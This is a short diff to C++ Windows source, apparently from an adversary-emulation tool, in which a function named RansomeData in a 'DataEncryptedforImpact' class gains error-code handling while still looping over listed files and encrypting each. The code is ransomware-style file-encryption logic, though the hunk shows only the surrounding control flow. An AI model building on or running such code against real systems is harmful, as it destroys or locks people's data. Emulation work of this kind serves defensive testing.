@@ -24,15 +24,18 @@ namespace win {
 		return true;
 	}
 
-	void DataEncryptedforImpact::RansomeData(std::wstring_view target_path)
+	DWORD DataEncryptedforImpact::RansomeData(std::wstring_view target_path)
 	{
+		DWORD result = ERROR_SUCCESS;
 		std::vector<std::wstring> txtFiles;
-		GetFileList(target_path, &txtFiles);
-
+		result = GetFileList(target_path, &txtFiles);
+		if (result != ERROR_SUCCESS)
+			return result;
 		for (const auto& file : txtFiles) {
 			EncryptFileData(file);
 		}
 
+		return result;
 	}
 
 	std::wstring DataEncryptedforImpact::ChangeFilenameExtensionForEncrypt(std::wstring_view target_file_path){
